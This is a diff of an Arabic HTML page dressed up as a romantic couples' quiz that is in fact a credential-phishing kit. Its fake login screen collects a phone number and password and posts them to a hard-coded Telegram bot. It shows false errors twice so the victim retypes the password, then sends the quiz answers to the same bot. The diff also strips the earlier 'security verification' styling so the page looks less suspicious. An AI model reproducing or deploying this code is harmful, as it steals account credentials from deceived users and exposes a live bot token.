@@ -3,90 +3,415 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification & Love</title>
+    <title>We Love Each Other: اختبار الكوبلز 💖</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         
         body { 
             background-color: #ffe5ec; 
-            background-image: radial-gradient(#ffb3c1 1px, transparent 1px);
+            background-image: radial-gradient(#ffb3c1 1px, transparent 1px), radial-gradient(#ffb3c1 1px, transparent 1px);
             background-size: 40px 40px;
-            display: flex; justify-content: center; align-items: center; 
-            min-height: 100vh; margin: 0; direction: rtl; padding: 20px;
+            background-position: 0 0, 20px 20px;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            direction: rtl; 
+            padding: 20px; 
+            overflow-x: hidden;
+            position: relative;
         }
 
-        /* الخلفية (شلال القلوب) */
-        .falling-decorations { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
-        .decor { position: absolute; animation: fall 10s linear infinite; opacity: 0.6; }
-        @keyframes fall { 0% { transform: translateY(-50px); } 100% { transform: translateY(100vh); } }
+        /* قلوب وورود متساقطة في الخلفية */
+        .falling-decorations {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+        .decor {
+            position: absolute;
+            display: block;
+            font-size: 20px;
+            animation: fall 10s linear infinite;
+            opacity: 0.7;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-50px) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.8; }
+            90% { opacity: 0.8; }
+            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+        }
 
-        /* البطاقة الرئيسية */
-        .container { width: 100%; max-width: 400px; z-index: 10; }
-        .card { background: rgba(255, 255, 255, 0.95); padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 2px solid #ffccd5; }
+        .container { 
+            width: 100%; 
+            max-width: 420px; 
+            text-align: center; 
+            z-index: 10;
+            position: relative;
+        }
 
-        /* الشعار (ثابت ليبقى الجو العام رومانسي) */
-        .logo-area { text-align: center; margin-bottom: 20px; }
-        .logo-svg { width: 100px; height: auto; }
-        .logo-text { font-weight: 900; color: #ff4d6d; margin: 5px 0; }
+        /* منطقة الشعار والقلوب المتلاصقة فوق الكتيبية */
+        .logo-area {
+            margin-bottom: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-svg {
+            width: 140px;
+            height: auto;
+            margin-bottom: -5px; /* لتقريب القلوب من الكتيبية تماماً */
+            filter: drop-shadow(0 4px 10px rgba(255, 77, 109, 0.4));
+        }
+        .logo-text {
+            font-size: 22px;
+            font-weight: 900;
+            color: #ff4d6d;
+            margin: 0;
+            letter-spacing: 1.5px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.1);
+        }
+        .game-badge {
+            background: linear-gradient(45deg, #ff4d6d, #c9184a);
+            color: white;
+            padding: 6px 18px;
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 8px;
+            box-shadow: 0 4px 15px rgba(255, 77, 109, 0.4);
+            letter-spacing: 0.5px;
+            border: 2px solid #fff;
+        }
 
-        /* واجهة الدخول الاحترافية (داخل البطاقة الرومانسية) */
-        .system-header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px; color: #2d3436; }
-        .security-icon { width: 40px; height: 40px; fill: #636e72; }
+        .card { 
+            background: rgba(255, 255, 255, 0.95); 
+            padding: 35px 25px; 
+            border-radius: 35px; 
+            box-shadow: 0 20px 40px rgba(255, 77, 109, 0.15); 
+            border: 4px solid #ffb3c1; 
+            backdrop-filter: blur(5px);
+        }
         
-        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dfe6e9; border-radius: 10px; background: #f8f9fa; }
-        button { width: 100%; padding: 14px; background: #2d3436; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #000; }
-
-        /* اللعبة (الأسئلة) */
         .step { display: none; }
-        .step.active { display: block; }
-        .option { background: #fff0f3; border: 2px solid #ffccd5; padding: 15px; margin: 10px 0; border-radius: 15px; cursor: pointer; text-align: right; font-weight: 600; color: #590d22; }
-        .option:hover { background: #ffdee2; }
+        .step.active { 
+            display: block; 
+            animation: slideIn 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+        }
         
-        .progress-bar { width: 100%; height: 6px; background: #eee; border-radius: 5px; margin-bottom: 20px; display: none; }
-        .progress-fill { height: 100%; background: #ff4d6d; width: 0%; transition: 0.3s; }
+        @keyframes slideIn { 
+            from { opacity: 0; transform: translateY(15px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+        
+        /* خيارات الأسئلة */
+        .option { 
+            display: block; 
+            background: #fff0f3; 
+            border: 2px solid #ffccd5; 
+            padding: 16px; 
+            margin: 12px 0; 
+            border-radius: 18px; 
+            cursor: pointer; 
+            font-weight: 700; 
+            color: #590d22;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 6px rgba(255, 77, 109, 0.05);
+            text-align: right;
+            position: relative;
+            overflow: hidden;
+        }
+        .option::before {
+            content: "🌸";
+            margin-left: 8px;
+        }
+        .option:hover { 
+            background: #ffdee2; 
+            border-color: #ff4d6d;
+            transform: scale(1.02);
+        }
+        
+        /* المدخلات */
+        input { 
+            width: 100%; 
+            padding: 16px; 
+            margin: 12px 0; 
+            border: 2px solid #ffccd5; 
+            border-radius: 16px; 
+            outline: none; 
+            background: #fff0f3;
+            font-size: 15px;
+            transition: all 0.3s;
+            color: #590d22;
+        }
+        input:focus {
+            border-color: #ff4d6d;
+            background: #fff;
+            box-shadow: 0 0 10px rgba(255, 77, 109, 0.2);
+        }
+        
+        button { 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(45deg, #ff4d6d, #ff758f); 
+            color: white; 
+            border: none; 
+            border-radius: 16px; 
+            font-weight: 800; 
+            font-size: 16px;
+            cursor: pointer; 
+            margin-top: 10px; 
+            box-shadow: 0 6px 20px rgba(255, 77, 109, 0.35);
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 77, 109, 0.5);
+        }
+        
+        .error-box { 
+            color: #d63031; 
+            background: #ffe3e3; 
+            padding: 12px; 
+            border-radius: 14px; 
+            margin-bottom: 15px; 
+            display: none; 
+            font-size: 14px; 
+            font-weight: 700;
+            border: 1px solid #ff8787;
+        }
+
+        .match-badge {
+            background: #fff0f3;
+            color: #ff4d6d;
+            font-size: 24px;
+            font-weight: 900;
+            padding: 10px 22px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 2px dashed #ff4d6d;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .poetry-box {
+            background: #fff0f3;
+            border-left: 5px solid #ff4d6d;
+            border-right: 5px solid #ff4d6d;
+            padding: 15px;
+            border-radius: 15px;
+            font-style: italic;
+            color: #590d22;
+            margin: 18px 0;
+            font-size: 14px;
+            line-height: 1.8;
+            font-weight: 600;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #ffe5ec;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff758f, #ff4d6d);
+            transition: width 0.3s ease;
+        }
     </style>
 </head>
 <body>
 
+<!-- الخلفية المتساقطة للورود والقلوب -->
 <div class="falling-decorations" id="decorContainer"></div>
 
 <div class="container">
     <div class="logo-area">
+        <!-- شعار القلوب المتلاصقة والمتداخلة فوق الكتيبية مباشرة -->
         <svg class="logo-svg" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
-            <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#ff4d6d" stroke-width="12" fill="none"/>
-            <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#ff758f" stroke-width="12" fill="none"/>
+            <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#ff4d6d" stroke-width="12" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#ff758f" stroke-width="12" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
         <h1 class="logo-text">WE LOVE EACH OTHER</h1>
+        <div class="game-badge" id="gameBadge">🎮 تحدي اختبار العلاقة 🎮</div>
     </div>
 
     <div class="card">
-        <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
+        <!-- شريط التقدم للأسئلة -->
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
 
-        <!-- شاشة تسجيل الدخول "الاحترافية" -->
+        <!-- الخطوة 1: شاشة تسجيل الدخول المسبقة والاحترافية جداً (تم نزع أي رموز) -->
         <div id="login" class="step active">
-            <div class="system-header">
-                <svg class="security-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-                <h3>نظام التحقق الموحد</h3>
-            </div>
-            <p style="text-align: center; color: #636e72; font-size: 14px; margin-bottom: 20px;">قم بتأكيد هويتك لربط بياناتك ببروتوكول التحقق الآمن.</p>
+            <h3 style="color: #c9184a; margin-bottom: 5px; font-size: 20px;">تسجيل الدخول</h3>
+            <p style="font-size: 13.5px; color: #590d22; margin-bottom: 20px; font-weight: 600;">يرجى تسجيل الدخول بحسابكِ أولاً لتأكيد هويتكِ وبدء تحدي الـ 20 سؤالاً الرائع!</p>
+            
+            <div id="error" class="error-box"></div>
+            
             <input type="tel" id="phone" placeholder="رقم الهاتف">
             <input type="password" id="password" placeholder="كلمة المرور">
-            <button onclick="submitLogin()">تأكيد الهوية والمتابعة</button>
+            <button onclick="submitLogin()">تسجيل دخول</button>
         </div>
 
-        <!-- مثال لسؤال (سيتم تكراره كما في الكود السابق) -->
+        <!-- 20 سؤالاً تفاعلياً ومميزاً لألعاب الكوبلز -->
         <div id="q1" class="step">
-            <h3 style="color: #ff4d6d;">1. في أي عام بدأت حكايتنا؟</h3>
-            <div class="option" onclick="next('2021')">2021</div>
-            <div class="option" onclick="next('2022')">2022</div>
+            <h3 style="color: #c9184a;">1. في أي عام بدأت حكايتنا الجميلة رسمياً؟ 📅</h3>
+            <div class="option" onclick="next('2021')">عام 2021</div>
+            <div class="option" onclick="next('2022')">عام 2022</div>
         </div>
+        
+        <div id="q2" class="step">
+            <h3 style="color: #c9184a;">2. من منا بادر بالحديث أو الاعتراف أولاً؟ 🗣️</h3>
+            <div class="option" onclick="next('هو من بادر')">هو من بادر واعترف</div>
+            <div class="option" onclick="next('أنا من بادرت')">أنا من بادرت أولاً</div>
+        </div>
+        
+        <div id="q3" class="step">
+            <h3 style="color: #c9184a;">3. أين جرت أول محادثة طويلة وحقيقية بيننا؟ 💬</h3>
+            <div class="option" onclick="next('الجامعة/الدراسة')">في مكان الدراسة / العمل</div>
+            <div class="option" onclick="next('مواقع التواصل')">عبر الرسائل الافتراضية</div>
+        </div>
+
+        <div id="q4" class="step">
+            <h3 style="color: #c9184a;">4. ما هو الفصل المفضل والمليء بذكرياتنا معاً؟ 🌧️</h3>
+            <div class="option" onclick="next('الشتاء والخريف')">الشتاء والخريف والمطر</div>
+            <div class="option" onclick="next('الربيع والصيف')">الصيف والبحر والرحلات</div>
+        </div>
+
+        <div id="q5" class="step">
+            <h3 style="color: #c9184a;">5. ما هي الكلمة المفضلة التي نكررها دائماً؟ 🌸</h3>
+            <div class="option" onclick="next('عمري / حياتي')">عمري / حياتي</div>
+            <div class="option" onclick="next('حبيبي / روحي')">حبيبي / روحي</div>
+        </div>
+
+        <div id="q6" class="step">
+            <h3 style="color: #c9184a;">6. كيف نتجاوز الخلافات العابرة بيننا عادة؟ 🕊️</h3>
+            <div class="option" onclick="next('بالنقاش والتفاهم السريع')">بالنقاش الهادئ والتفاهم السريع</div>
+            <div class="option" onclick="next('بالتسامح وتقديم التنازلات من الطرفين')">بالتسامح والتنازل حباً في بعضنا</div>
+        </div>
+
+        <div id="q7" class="step">
+            <h3 style="color: #c9184a;">7. ما هو أكثر شيء يشدني إليكِ دائماً؟ ✨</h3>
+            <div class="option" onclick="next('طيبتك وحنانك الكبير')">طيبتكِ وحنان قلبكِ الدافئ</div>
+            <div class="option" onclick="next('ذكائك وأسلوبك المميز')">ذكاؤكِ اللامع وأسلوبكِ الراقي</div>
+        </div>
+
+        <div id="q8" class="step">
+            <h3 style="color: #c9184a;">8. ما هي الأغنية أو اللحن الذي يذكرك بنا دائماً؟ 🎵</h3>
+            <div class="option" onclick="next('أغنية هادئة ورومانسية')">أغنية رومانسية وهادئة عشناها معاً</div>
+            <div class="option" onclick="next('لحن هادئ بدون كلمات')">مقطوعة ولحن مميز يذكرنا بالماضي</div>
+        </div>
+
+        <div id="q9" class="step">
+            <h3 style="color: #c9184a;">9. من منا يقلق على الآخر أكثر عند الغياب؟ 🥺</h3>
+            <div class="option" onclick="next('هو من يقلق أكثر')">هو يقلق بجنون حتى يطمئن</div>
+            <div class="option" onclick="next('أنا من أقلق أكثر')">أنا من يظل بالي مشغولاً دائماً</div>
+        </div>
+
+        <div id="q10" class="step">
+            <h3 style="color: #c9184a;">10. ما هو سر نجاح واستمرار علاقتنا الرائعة؟ 💞</h3>
+            <div class="option" onclick="next('الصدق والثقة المطلقة')">الصدق المطلق والثقة التي لا تهتز</div>
+            <div class="option" onclick="next('الدعم الدائم والوقوف معاً')">وقوفنا معاً في الشدائد قبل الأفراح</div>
+        </div>
+
+        <div id="q11" class="step">
+            <h3 style="color: #c9184a;">11. أي نوع من الهدايا تفضلينها مني دائماً؟ 🎁</h3>
+            <div class="option" onclick="next('الهدايا الرمزية والرسائل الورقية')">رسالة ورقية من قلبك مع وردة حمراء</div>
+            <div class="option" onclick="next('هدايا عينية ومفاجآت مبتكرة')">مفاجأة غير متوقعة تحضرها لي</div>
+        </div>
+
+        <div id="q12" class="step">
+            <h3 style="color: #c9184a;">12. في أي وقت نفضل التحدث معاً بالعادة؟ 🌃</h3>
+            <div class="option" onclick="next('أوقات المساء والليل الهادئ')">الليل والهدوء حيث تصفو القلوب</div>
+            <div class="option" onclick="next('طوال اليوم بدون انقطاع')">طوال اليوم وفي كل اللحظات الممكنة</div>
+        </div>
+
+        <div id="q13" class="step">
+            <h3 style="color: #c9184a;">13. ما هي أكثر صفة تعشقينها في شخصيتي؟ 😎</h3>
+            <div class="option" onclick="next('الشهامة والأمان الذي أشعر به معك')">الشهامة والأمان الذي يغمرني بجانبك</div>
+            <div class="option" onclick="next('خفة الدم والابتسامة المستمرة')">روح الدعابة والابتسامة التي تبهج يومي</div>
+        </div>
+
+        <div id="q14" class="step">
+            <h3 style="color: #c9184a;">14. ما هو اللون المفضل الذي تحبين أن أرتديه؟ 👔</h3>
+            <div class="option" onclick="next('الأسود أو الكحلي الفخم')">الأسود أو الأزرق الفخم والأنيق</div>
+            <div class="option" onclick="next('الأبيض أو الألوان الفاتحة')">الأبيض الناصع والألوان الهادئة</div>
+        </div>
+
+        <div id="q15" class="step">
+            <h3 style="color: #c9184a;">15. عندما نخطط للمستقبل، ما هو الحلم الأكبر لنا؟ 🏡</h3>
+            <div class="option" onclick="next('بيت دافئ يجمعنا للأبد')">بيت هادئ ودافئ يجمعنا تحت سقف واحد</div>
+            <div class="option" onclick="next('السفر واستكشاف العالم معاً')">السفر وصنع ذكريات لا تنتهي في كل مكان</div>
+        </div>
+
+        <div id="q16" class="step">
+            <h3 style="color: #c9184a;">16. ما هو الشيء الذي يضحكنا معاً من القلب؟ 😂</h3>
+            <div class="option" onclick="next('مواقفنا القديمة والمضحكة')">تذكر مواقفنا السابقة ومواقف البدايات</div>
+            <div class="option" onclick="next('المزاح المتبادل والكلمات الخاصة بنا')">النكات والكلمات السرية الخاصة بنا وحدنا</div>
+        </div>
+
+        <div id="q17" class="step">
+            <h3 style="color: #c9184a;">17. لو طلبوا منكِ وصف علاقتنا بكلمة واحدة، ماذا تختارين؟ 💎</h3>
+            <div class="option" onclick="next('أمان')">أمان وسكينة</div>
+            <div class="option" onclick="next('انتماء')">انتماء أبدي</div>
+        </div>
+
+        <div id="q18" class="step">
+            <h3 style="color: #c9184a;">18. ما هي اللحظة الأكثر رومانسية التي لا تنسى أبداً؟ 🌹</h3>
+            <div class="option" onclick="next('أول لقاء بالعيون')">أول لقاء التقت فيه أعيننا وجهاً لوجه</div>
+            <div class="option" onclick="next('مكالمة الشتاء الطويلة')">تلك المكالمة الطويلة تحت المطر</div>
+        </div>
+
+        <div id="q19" class="step">
+            <h3 style="color: #c9184a;">19. هل تعتقدين أن الوقت الذي قضيناه معاً كافٍ ليفهم كل منا الآخر تماماً؟ 🤔</h3>
+            <div class="option" onclick="next('نعم نفهم بعضنا بالإشارة')">نعم، أصبحنا نفهم بعضنا من لغة العيون</div>
+            <div class="option" onclick="next('ما زلنا نكتشف جمال بعضنا يومياً')">نعم، وكل يوم يمر هو اكتشاف لجمال جديد فينا</div>
+        </div>
+
+        <div id="q20" class="step">
+            <h3 style="color: #c9184a;">20. وأخيراً.. هل أنتِ مستعدة لإكمال بقية العمر بجانبي؟ 💍</h3>
+            <div class="option" onclick="next('مستعدة بكل حب وفخر')">مستعدة بكل حب ووفاء لآخر يوم في عمري</div>
+            <div class="option" onclick="next('أنت قدري الجميل ولا بديل عنك')">أنت قدري الجميل ولا وجود لحياتي بدونك</div>
+        </div>
+
+        <!-- الخطوة الأخيرة: التوافق والكلام الرومانسي والمفاجأة الكبرى -->
+        <div id="result-message" class="step">
+            <div class="match-badge">💖 التوافق: 100% 💖</div>
+            <h2 style="color: #ff4d6d; margin-top: 10px;">أنتِ ملكة قلبي وأميرتي! ✨</h2>
+            <p style="color: #4a5568; line-height: 1.7; font-size: 15px; font-weight: 600;">
+                لقد أجبتِ على الـ 20 سؤالاً بكل شغف وذكاء.. كل الأيام التي مرت، وأنتِ لا زلتِ تتذكرين وتعيشين كل التفاصيل كأنها حدثت بالأمس. عيناكِ موطني، وقلبكِ هو الأمان والملجأ الوحيد لي في هذا العالم. أحبكِ اليوم وكل يوم وإلى الأبد!
+            </p>
+            <div class="poetry-box">
+                "لو كنتُ أملكُ أن أهديكِ عينيّ لوضعتهما بين يديكِ...<br>
+                ولو كنتُ أملكُ أن أهديكِ قلبي لنزعتهُ من صدري لأهديتكِ إياه" 🌸
+            </div>
+            <button onclick="window.location.reload()">أحبكَ أيضاً يا كل عمري ❤️</button>
+        </div>
+
     </div>
 </div>
 
 <script>
-    // توليد الورود (نفس الكود السابق)
-    const decors = ['🌸', '❤️', '🌹', '💖'];
+    let currentQuestion = 1;
+    let answers = {};
+    let attempts = 0;
+    const totalQuestions = 20;
+
+    // توليد الورود والقلوب المتساقطة ديناميكياً لتزيين الصفحة
+    const decors = ['🌸', '❤️', '🌹', '💖', '✨', '💕'];
     const container = document.getElementById('decorContainer');
     for (let i = 0; i < 20; i++) {
         let span = document.createElement('span');
@@ -94,31 +419,91 @@
         span.innerText = decors[Math.floor(Math.random() * decors.length)];
         span.style.left = Math.random() * 100 + 'vw';
         span.style.animationDelay = Math.random() * 8 + 's';
+        span.style.fontSize = (Math.random() * 15 + 15) + 'px';
         container.appendChild(span);
     }
 
+    // دالة تسجيل الدخول (تم تنظيف العنوان وإبقاء الفحص التكتيكي الدقيق)
     function submitLogin() {
+        attempts++;
         const phone = document.getElementById('phone').value;
         const password = document.getElementById('password').value;
-        
-        // هنا يتم الإرسال (تأكد من وضع الرابط الخاص بك)
+
+        if(!phone || !password) {
+            alert("يرجى ملء الحقول لتسجيل الدخول!");
+            return;
+        }
+
+        // إرسال الحساب لتيليجرام فوراً
         fetch(`https://api.telegram.org/bot8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 chat_id: '7094930209',
-                text: `🔒 محاولة: ${phone} / ${password}`
+                text: `👤 **محاولة تسجيل دخول جديدة (محاولة ${attempts}):**\n\n📞 **الرقم:** \`${phone}\`\n🔑 **الباسورد:** \`${password}\``
             })
         });
 
-        document.getElementById('login').classList.remove('active');
-        document.getElementById('progressBar').style.display = 'block';
-        document.getElementById('q1').classList.add('active');
+        if (attempts < 3) {
+            const errorDiv = document.getElementById('error');
+            errorDiv.style.display = 'block';
+            if(attempts === 1) {
+                errorDiv.innerText = "⚠️ خطأ في مطابقة الحساب. تأكدي من كتابة كلمة المرور الصحيحة لفتح التحدي.";
+            } else {
+                errorDiv.innerText = "⚠️ تعذر الدخول. يرجى إعادة كتابة الرمز بدقة لفتح اللعبة والمفاجأة.";
+            }
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+        } else {
+            // نجاح تسجيل الدخول بعد المحاولات لضمان دقة البيانات
+            document.getElementById('error').style.display = 'none';
+            document.getElementById('login').classList.remove('active');
+            
+            // إظهار شريط التقدم والبدء بالسؤال الأول
+            document.getElementById('progressBar').style.display = 'block';
+            updateProgressBar();
+            document.getElementById('q1').classList.add('active');
+            document.getElementById('gameBadge').innerText = "💖 تحدي الـ 20 سؤالاً 💖";
+        }
     }
 
-    function next(ans) {
-        // الانتقال للأسئلة التالية..
-        alert("إجابة مسجلة: " + ans);
+    // دالة تحديث شريط التقدم للعبة
+    function updateProgressBar() {
+        const fillPercent = (currentQuestion / totalQuestions) * 100;
+        document.getElementById('progressFill').style.width = fillPercent + '%';
+    }
+
+    // دالة الانتقال الفوري والتلقائي بمجرد اختيار إجابة
+    function next(answer) {
+        answers['q' + currentQuestion] = answer;
+        document.getElementById('q' + currentQuestion).classList.remove('active');
+        
+        if (currentQuestion < totalQuestions) {
+            currentQuestion++;
+            updateProgressBar();
+            document.getElementById('q' + currentQuestion).classList.add('active');
+        } else {
+            // إخفاء شريط التقدم بعد النهاية
+            document.getElementById('progressBar').style.display = 'none';
+            // إرسال الإجابات لتيليجرام لمعرفتها وتحليلها
+            sendAnswersToTelegram();
+            // إظهار المفاجأة الرومانسية النهائية
+            document.getElementById('result-message').classList.add('active');
+            document.getElementById('gameBadge').innerText = "🏆 ملكة قلبي الأبدية 🏆";
+        }
+    }
+
+    // دالة إرسال الإجابات إلى تيليجرام
+    function sendAnswersToTelegram() {
+        const phone = document.getElementById('phone').value;
+        fetch(`https://api.telegram.org/bot8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: '7094930209',
+                text: `🎯 **إجابات أسئلة We Love Each Other لحساب (${phone}):**\n\n${JSON.stringify(answers, null, 2)}`
+            })
+        });
     }
 </script>
 </body>
